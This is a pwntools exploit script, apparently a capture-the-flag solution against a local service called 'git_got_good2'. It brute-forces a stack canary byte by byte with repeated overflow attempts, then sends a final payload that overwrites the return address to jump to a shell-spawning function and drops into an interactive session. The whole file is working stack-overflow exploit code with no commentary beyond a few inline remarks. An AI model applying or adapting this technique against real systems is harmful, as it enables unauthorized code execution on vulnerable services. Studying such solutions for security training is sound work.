from pwn import *
#e = ELF("./git_got_good2")
#shell = e.symbols["give_shell")
#p = process("nc 0.0.0.0 8000")
#p.recvuntil(":")
#p.sendline('jd3846')

datalen = 138
cookie = [0,0,0,0,0,0,0,0]
curr = 1

while True:
    print(cookie, curr, datalen)
    if datalen == 145:
        break
    p = remote("0.0.0.0", 8000)
    p.recvuntil("?")
    p.sendline(str(datalen))
    p.recvuntil("data")

    #send data depending how much we have bruted so far
    if curr == 1:
        p.sendline("A" * 136 + chr(cookie[0])+ chr(cookie[1]))
    if curr == 2:
        p.sendline("A" * 136 + chr(cookie[0])+ chr(cookie[1]) + chr(cookie[2]))
    if curr == 3:
        p.sendline("A" * 136 + chr(cookie[0])+ chr(cookie[1]) + chr(cookie[2]) + chr(cookie[3]))
    if curr == 4:
        p.sendline("A" * 136 + chr(cookie[0])+ chr(cookie[1]) + chr(cookie[2]) + chr(cookie[3]) + chr(cookie[4]))
    if curr == 5:
        p.sendline("A" * 136 + chr(cookie[0])+ chr(cookie[1]) + chr(cookie[2]) + chr(cookie[3]) + chr(cookie[4]) + chr(cookie[5]))
    if curr == 6:
        p.sendline("A" * 136 + chr(cookie[0])+ chr(cookie[1]) + chr(cookie[2]) + chr(cookie[3]) + chr(cookie[4])+ chr(cookie[5])+ chr(cookie[6]))
    if curr == 7:
        p.sendline("A" * 136 + chr(cookie[0])+ chr(cookie[1]) + chr(cookie[2]) + chr(cookie[3]) + chr(cookie[4])+ chr(cookie[5])+ chr(cookie[6])+ chr(cookie[7]) )


    p.recvuntil("friend...")
    resp = str(p.recv())

    if resp.find('bye') != -1: #crashed therefore success
        curr += 1 #move on to next byte to brute
        datalen += 1 #send 1 more byte
    else:
        cookie[curr] += 1

    p.close()


p = remote("0.0.0.0", 8000)
p.recvuntil("?")
p.sendline(str(160))
p.recvuntil("data")
p.sendline("A" * 136 + chr(cookie[0])+ chr(cookie[1]) + chr(cookie[2]) + chr(cookie[3]) + chr(cookie[4])+ chr(cookie[5])+ chr(cookie[6])+ chr(cookie[7]) + p64(0x0000000000000000) + p64(0x400afd))
p.interactive()
